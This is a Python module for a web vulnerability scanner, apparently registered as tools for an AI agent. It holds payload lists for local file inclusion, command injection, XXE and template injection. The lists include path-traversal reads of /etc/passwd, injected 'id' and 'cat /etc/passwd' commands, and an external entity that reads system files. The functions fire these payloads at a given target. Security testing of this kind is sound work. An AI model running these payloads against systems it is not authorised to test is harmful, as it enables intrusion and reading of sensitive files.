"""Advanced injection scanners: LFI, Command Injection, XXE, SSTI."""
import asyncio, httpx, re
from .mcp_registry import registry

LFI_PAYLOADS = [
    ("../../../../etc/passwd", "root:"),
    ("../../../etc/passwd", "root:"),
    ("....//....//....//....//etc/passwd", "root:"),
    ("..%2f..%2f..%2f..%2fetc%2fpasswd", "root:"),
    ("..%252f..%252f..%252f..%252fetc%252fpasswd", "root:"),
    ("/etc/passwd", "root:"),
    ("../../../../etc/hosts", "localhost"),
    ("php://filter/convert.base64-encode/resource=index", "PD9waHA"),
    ("file:///etc/passwd", "root:"),
    ("../../../../windows/win.ini", "[fonts]"),
]

CMD_INJECTION_PAYLOADS = [
    ("; id", "uid="),
    ("| id", "uid="),
    ("`id`", "uid="),
    ("$(id)", "uid="),
    ("; uname -a", "Linux"),
    ("| cat /etc/passwd", "root:"),
    ("; ls -la", "total"),
    ("& ping -c 1 127.0.0.1 &", "icmp"),
    ("\nid", "uid="),
    ("; whoami", "root"),
]

XXE_PAYLOADS = '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>'''

SSTI_PAYLOADS = [
    ("{{7*7}}", "49"),
    ("${7*7}", "49"),
    ("<%= 7*7 %>", "49"),
    ("{{config}}", "Config"),
    ("{{self.__init__.__globals__}}", "__builtins__"),
    ("${{7*7}}", "49"),
]


async def scan_lfi(target: str, param: str = "file") -> dict:
    """Scan for Local File Inclusion vulnerabilities."""
    found = []
    base = f"{target.rstrip('/')}/"
    
    async def test(payload, signature):
        try:
            url = f"{base}?{param}={payload}"
            async with httpx.AsyncClient(timeout=10, verify=False) as c:
                r = await c.get(url)
                if signature in (r.text or ""):
                    found.append({"payload": payload, "signature": signature,
                                  "status": r.status_code, "vulnerable": True})
        except: pass
    
    await asyncio.gather(*[test(p, s) for p, s in LFI_PAYLOADS])
    
    return {
        "target": target, "param": param, "type": "LFI",
        "tested": len(LFI_PAYLOADS), "vulnerable": len(found) > 0,
        "findings": found
    }


async def scan_cmd_injection(target: str, param: str = "cmd") -> dict:
    """Scan for command injection vulnerabilities."""
    found = []
    base = f"{target.rstrip('/')}/"
    
    async def test(payload, signature):
        try:
            url = f"{base}?{param}={payload}"
            async with httpx.AsyncClient(timeout=10) as c:
                r = await c.get(url)
                if signature in (r.text or ""):
                    found.append({"payload": payload, "signature": signature,
                                  "status": r.status_code, "vulnerable": True})
        except: pass
    
    await asyncio.gather(*[test(p, s) for p, s in CMD_INJECTION_PAYLOADS])
    
    return {
        "target": target, "param": param, "type": "Command Injection",
        "tested": len(CMD_INJECTION_PAYLOADS), "vulnerable": len(found) > 0,
        "findings": found
    }


async def scan_xxe(target: str, endpoint: str = "/") -> dict:
    """Scan for XML External Entity (XXE) vulnerabilities."""
    try:
        url = f"{target.rstrip('/')}{endpoint}"
        async with httpx.AsyncClient(timeout=10) as c:
            r = await c.post(url, content=XXE_PAYLOADS.encode(),
                             headers={"Content-Type": "application/xml"})
            vulnerable = "root:" in (r.text or "")
            return {
                "target": target, "endpoint": endpoint, "type": "XXE",
                "vulnerable": vulnerable,
                "response_size": len(r.content),
                "response_preview": (r.text or "")[:300]
            }
    except Exception as e:
        return {"target": target, "error": str(e), "vulnerable": False}


async def scan_ssti(target: str, param: str = "name") -> dict:
    """Scan for Server-Side Template Injection vulnerabilities."""
    found = []
    base = f"{target.rstrip('/')}/"
    
    async def test(payload, signature):
        try:
            url = f"{base}?{param}={payload}"
            async with httpx.AsyncClient(timeout=10) as c:
                r = await c.get(url)
                if signature in (r.text or ""):
                    found.append({"payload": payload, "signature": signature,
                                  "vulnerable": True})
        except: pass
    
    await asyncio.gather(*[test(p, s) for p, s in SSTI_PAYLOADS])
    
    return {
        "target": target, "param": param, "type": "SSTI",
        "tested": len(SSTI_PAYLOADS), "vulnerable": len(found) > 0,
        "findings": found
    }


registry.register("scan_lfi", "Scan for Local File Inclusion vulnerabilities",
                  {"target": "str", "param": "str"}, scan_lfi)
registry.register("scan_cmd_injection", "Scan for command injection vulnerabilities",
                  {"target": "str", "param": "str"}, scan_cmd_injection)
registry.register("scan_xxe", "Scan for XML External Entity vulnerabilities",
                  {"target": "str", "endpoint": "str"}, scan_xxe)
registry.register("scan_ssti", "Scan for Server-Side Template Injection",
                  {"target": "str", "param": "str"}, scan_ssti)
